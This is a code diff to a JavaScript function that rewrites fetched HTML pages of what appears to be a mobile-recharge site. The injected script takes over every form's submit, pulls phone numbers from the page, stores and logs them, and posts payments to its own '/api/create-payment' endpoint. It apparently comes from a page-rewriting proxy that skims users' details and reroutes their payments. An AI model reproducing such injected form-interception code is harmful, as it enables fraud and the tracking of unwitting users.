@@ -130,29 +130,29 @@ async function modifyHTML(response) {
                              !document.querySelector('[data-amount], .recharge-amount');
           
           if (isFirstStep) {
-            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
-              try {
-                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
-                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
-                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
-                await fetch('/api/store-phone', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ phoneNumber: phoneInput.value.replace(/\\D/g, '') })
-                });
-              } catch (e) { console.error('Error storing phone:', e); }
-            }
             return true;
           }
           
-          // Extract phone number from span if available
+          // CRITICAL FIX: Extract phone number from span if available
+          // This has priority over all other methods
           let phoneSpan = document.querySelector('.form-group.phone span');
-          if (phoneSpan && phoneSpan.textContent && phoneSpan.textContent.match(/\\d{9}/)) {
-            phoneNumber = phoneSpan.textContent.trim();
-            console.log('Phone number found in span:', phoneNumber);
+          if (phoneSpan && phoneSpan.textContent) {
+            // Extract only the digits from the span text
+            const digits = phoneSpan.textContent.replace(/[^0-9]/g, '');
+            if (digits.match(/\\d{9}/)) {
+              phoneNumber = digits;
+              console.log('Phone number found in span:', phoneNumber);
+              
+              // Save this to local storage for backup
+              try {
+                sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
+                localStorage.setItem('rechargePhoneNumber', phoneNumber);
+                window.phoneNumberForPayment = phoneNumber;
+              } catch (e) { console.error('Error storing phone locally:', e); }
+            }
           }
           
+          // If we still don't have a valid phone, try other sources
           if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
             try {
               phoneNumber = window.phoneNumberForPayment || 
@@ -173,6 +173,8 @@ async function modifyHTML(response) {
           if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
             amount = document.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
           }
+          
+          console.log('Sending payment request with phone:', phoneNumber);
           
           const response = await fetch('/api/create-payment', {
             method: 'POST',
@@ -203,16 +205,30 @@ async function modifyHTML(response) {
       };
       
       document.addEventListener('DOMContentLoaded', function() {
+        // Add event handler for forms
         document.querySelectorAll('form').forEach(form => {
           form.addEventListener('submit', function(event) {
             const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
-            const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-            let phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
             
-            // Check for phone span element
+            // Prioritize phone from span
+            let phoneNumber = '';
             const phoneSpan = document.querySelector('.form-group.phone span');
-            if (phoneSpan && phoneSpan.textContent && phoneSpan.textContent.match(/\\d{9}/)) {
-              phoneNumber = phoneSpan.textContent.trim();
+            if (phoneSpan) {
+              // Extract only digits
+              const digits = phoneSpan.textContent.replace(/[^0-9]/g, '');
+              if (digits.match(/\\d{9}/)) {
+                phoneNumber = digits;
+                console.log('Form submit: Using phone from span:', phoneNumber);
+              }
+            }
+            
+            // Fallback to input if span not found
+            if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
+              if (phoneInput) {
+                phoneNumber = phoneInput.value.replace(/\\D/g, '');
+                console.log('Form submit: Using phone from input:', phoneNumber);
+              }
             }
             
             window.processPayment(amount, phoneNumber, event);
